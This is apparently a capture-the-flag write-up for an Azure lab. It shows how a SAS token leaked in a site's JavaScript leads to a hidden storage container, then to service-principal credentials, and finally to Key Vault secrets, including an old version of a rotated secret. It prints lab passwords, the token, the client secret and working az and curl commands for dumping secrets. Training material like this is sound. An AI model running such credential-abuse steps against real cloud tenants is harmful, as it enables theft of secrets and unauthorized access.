**Tags:** Cloud, Azure, Storage, Vault.

**Difficulty:** Medium.

## 1. Getting Started

Room target:

```text
https://cryptocabanaf5scjagc.z13.web.core.windows.net/
```

The room suggests working with Azure. At the beginning, we are instructed to install the Azure CLI:

```bash
curl -fsSL 'https://azurecliprod.blob.core.windows.net/$root/deb_install.sh' | sudo bash
```

After installation, we check the version:

```bash
az --version
```

We get:

```text
azure-cli                         2.89.0
core                              2.89.0
telemetry                          1.1.0

Dependencies:
msal                              1.36.0
azure-mgmt-resource               24.0.0

Python location '/opt/az/bin/python3'
Config directory '/home/deb88/.azure'
Extensions directory '/home/deb88/.azure/cliextensions'

Python (Linux) 3.14.6 (main, Jul 28 2026, 12:41:02) [GCC 12.2.0]
```

However, it later turns out that the local Azure CLI is not actually required to solve the room, since the main work is performed through **Azure Cloud Shell** in the browser.

---

# 2. Azure Cloud Shell

We are given credentials valid for 1 hour:

```text
Username: usr-08067397@thmctf.onmicrosoft.com
Password: +*3V4CKS
```

After logging in, we open Azure Cloud Shell:

```text
Requesting a Cloud Shell.Succeeded.
Connecting terminal...

Welcome to Azure Cloud Shell

Type "az" to use Azure CLI
Type "help" to learn about Cloud Shell

Your Cloud Shell session will be ephemeral so no files or system changes will persist beyond your current session.

usr-08067397 [ ~ ]$
```

We check the current Azure subscription:

```bash
az account show
```

We get:

```json
{
  "environmentName": "AzureCloud",
  "homeTenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
  "id": "2492269a-2948-46fd-aae3-68c9b066443a",
  "isDefault": true,
  "managedByTenants": [],
  "name": "Az-Subs-CTF",
  "state": "Enabled",
  "tenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
  "user": {
    "cloudShellID": true,
    "name": "usr-08067397@thmctf.onmicrosoft.com",
    "type": "user"
  }
}
```

Thus, we have access to the subscription:

```text
Az-Subs-CTF
```

---

# 3. Frontend Analysis

An important part of the room is located directly in the JavaScript code of the main page.

In `app.js`, we find:

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";
```

The backup function constructs a URL directly to Azure Blob Storage:

```javascript
function backupPhrase() {
  const phrase = document.getElementById("phrase").value.trim();
  const status = document.getElementById("status");

  if (!phrase) {
    status.textContent = "Enter a phrase first.";
    return;
  }

  const blobName = "backup-" + Date.now() + ".txt";
  const url =
    "https://" + STORAGE_ACCOUNT + ".blob.core.windows.net/" +
    BACKUPS_CONTAINER + "/" + blobName + "?" + BACKUP_SAS;

  fetch(url, {
    method: "PUT",
    headers: { "x-ms-blob-type": "BlockBlob" },
    body: phrase,
  })
    .then((res) => {
      status.textContent = res.ok
        ? "Backed up. Sleep easy."
        : "Backup failed (" + res.status + ").";
    })
    .catch(() => {
      status.textContent = "Backup failed — network error.";
    });
}
```

We can immediately identify:

```text
Storage Account: cryptocabanaf5scjagc
Container: backups
SAS token: present directly in the frontend
```

---

# 4. Using the SAS Token

The obtained SAS allows us to access Blob Storage.

We check the `backups` container:

```text
https://cryptocabanaf5scjagc.blob.core.windows.net/backups?restype=container&comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D
```

We get:

```xml
<EnumerationResults ServiceEndpoint="https://cryptocabanaf5scjagc.blob.core.windows.net/" ContainerName="backups">
  <Blobs/>
  <NextMarker/>
</EnumerationResults>
```

The `backups` container is empty.

---

# 5. Enumerating Azure Resources

We check the available resources from Cloud Shell:

```bash
az resource list -o table
```

Then:

```bash
az storage account list -o table
```

And:

```bash
az group list -o table
```

We get:

```text
Name                Location    Status
------------------  ----------  ---------
rg-cloudshell-only  centralus   Succeeded
```

At first glance, there is practically nothing interesting in the subscription.

Next, we enumerate the registered Azure AD applications:

```bash
az ad app list --all --output table
```

We get:

```text
DisplayName                     Id                                    AppId                                 CreatedDateTime
------------------------------  ------------------------------------  ------------------------------------  --------------------
attacker-app-day9               bf4d873f-d24b-426b-94d5-761ee943f743  d92b4c7a-f523-4f3c-b808-bc3886e4420d  2026-08-04T16:39:52Z
cryptocabana-backup-automation  3c76ca15-8452-475e-98cf-5d1a3773d5ad  dbcf2923-e4eb-4b72-a0a4-688aa1185cf5  2026-07-19T15:17:11Z
sp-ch2-student                  35f2cf5f-071f-41f3-ba0c-ccc7a688aed  f4b35c22-fe24-478c-a721-ef12f7b7c15b  2026-04-13T19:57:29Z
thm-range-collector-pilot       a9c1efc4-3329-4186-8b10-0f9d1d3d5c45  b83d1315-dd2c-4d2e-994b-5eb463dd7e45  2026-06-01T18:26:18Z
thm-range-provisioner-pilot     be4317cf-6a32-4929-8af7-18e3ea0d4352  55bf75ab-2c7d-4829-93e2-d6100ad5ec38  2026-06-01T18:25:39Z
```

The most interesting application is:

```text
cryptocabana-backup-automation
```

---

# 6. Service Principal Analysis

We check the application configuration:

```bash
az ad app show --id dbcf2923-e4eb-4b72-a0a4-688aa1185cf5
```

As a result, we discover a password credential:

```json
"passwordCredentials": [
  {
    "displayName": "backup-automation-secret",
    "endDateTime": "2028-07-19T15:17:23.7751282Z",
    "hint": "UBX",
    "keyId": "a71cab71-e96c-4534-8f46-60c0bf12c63d",
    "secretText": null,
    "startDateTime": "2026-07-19T15:17:23.7751282Z"
  }
]
```

The `secretText` itself is not revealed through `az ad app show`.

Next, we obtain the Service Principal:

```bash
az ad sp list --filter "displayName eq 'cryptocabana-backup-automation'" -o json
```

The main data is:

```text
appDisplayName:
cryptocabana-backup-automation

appId:
dbcf2923-e4eb-4b72-a0a4-688aa1185cf5

id:
852d18bd-f951-4f8a-a0ed-ce3788609245
```

---

# 7. Returning to Blob Storage

Since the SAS allows us to enumerate the storage account's containers, we check not only `backups`, but the entire Storage Account:

```bash
curl "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
```

The response contains three containers:

```xml
<Container><Name>$web</Name></Container>
<Container><Name>backups</Name></Container>
<Container><Name>vault</Name></Container>
```

The most interesting one is:

```text
vault
```

This means that using the SAS token exposed by the frontend, we can discover a hidden container.

---

# 8. Enumerating `vault`

Now we access the `vault` container directly:

```bash
curl "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
```

We get two objects:

```text
backup-service-account.json
seed_phrase.txt
```

The most interesting one is:

```text
backup-service-account.json
```

Size:

```text
360 bytes
```

and:

```text
seed_phrase.txt
```

with a size of:

```text
88 bytes
```

This gives us the following chain:

```text
Public website
      │
      ▼
app.js
      │
      ▼
SAS token
      │
      ▼
Storage Account
      │
      ▼
vault
      │
      ├── backup-service-account.json
      │
      └── seed_phrase.txt
```

---

# 9. Obtaining Service Principal Credentials

From `backup-service-account.json`, we obtain the service account credentials.

We use them to log in to Azure:

```bash
az logout
```

After logging out:

```bash
az login --service-principal \
-u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \
-p 'UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg' \
--tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c
```

Azure confirms successful authentication:

```json
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
    "id": "2492269a-2948-46fd-aae3-68c9b066443a",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Az-Subs-CTF",
    "state": "Enabled",
    "tenantId": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c",
    "user": {
      "name": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
      "type": "servicePrincipal"
    }
  }
]
```

We check:

```bash
az account show
```

The current user is now the Service Principal:

```text
name:
dbcf2923-e4eb-4b72-a0a4-688aa1185cf5

type:
servicePrincipal
```

---

# 10. Searching for Key Vault

With the obtained permissions, we enumerate secrets in the Key Vault:

```bash
az keyvault secret list \
--id https://ccabana-kv-f5scjagc.vault.azure.net/
```

We discover:

```text
key-shard-1
key-shard-2
key-shard-3
master-key
```

The three `key-shard` secrets are especially interesting:

```text
key-shard-1
key-shard-2
key-shard-3
```

as well as:

```text
master-key
```

---

# 11. Obtaining Secret Values

To retrieve the values, we run:

```bash
for s in key-shard-1 key-shard-2 key-shard-3 master-key; do
echo "===== $s ====="
az keyvault secret show \
--id "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/$s" \
--query value -o tsv
done
```

We get:

```text
===== key-shard-1 =====
THM{n0t_ur

===== key-shard-2 =====
Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.

===== key-shard-3 =====
ur_c01ns!}

===== master-key =====
(Forbidden) Caller is not authorized to perform action on resource.
```

---

# 12. Assembling the Incomplete Flag

The first and third parts give us:

```text
key-shard-1:
THM{n0t_ur
```

and:

```text
key-shard-3:
ur_c01ns!}
```

If we combine them:

```text
THM{n0t_urur_c01ns!}
```

This is obviously an incorrect string.

At the same time, `key-shard-2` says:

```text
Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.
```

This is an obvious hint toward an **old secret version**.

---

# 13. Searching for Old Versions of `key-shard-2`

We use:

```bash
az keyvault secret list-versions \
--id https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2 \
-o json
```

We get two versions:

```text
3d6492d2c6f74123bc754a9ded22b2a0
```

and:

```text
c922c422ffb34671a902389c372314f1
```

One of them is the current version, while the other is the old version.

---

# 14. Obtaining the Old Value

We request the old version:

```bash
az keyvault secret show \
--id "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0" \
--query value -o tsv
```

We get:

```text
_k3ys_n0t_
```

This is the missing part.

Now we combine the three fragments:

```text
key-shard-1:
THM{n0t_ur

key-shard-2 (old value):
_k3ys_n0t_

key-shard-3:
ur_c01ns!}
```

We get:

```text
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```

---

# Final Chain

```text
Frontend
   │
   ▼
app.js
   │
   ▼
SAS token
   │
   ▼
Azure Blob Storage
   │
   ▼
Hidden vault container
   │
   ├── backup-service-account.json
   │
   ▼
Service Principal
   │
   ▼
Azure Key Vault
   │
   ├── key-shard-1
   ├── key-shard-2
   ├── key-shard-3
   └── master-key
          │
          ▼
   key-shard-2 has old versions
          │
          ▼
   retrieve the old value
          │
          ▼
      assemble the flag
          │
          ▼
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```

## Flag

```text
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```

The main idea of the room is **SAS token leakage in the frontend → access to Azure Blob Storage → discovery of the hidden `vault` → extraction of Service Principal credentials → access to Key Vault → finding the old version of a rotated secret → assembling the flag from multiple key shards**.
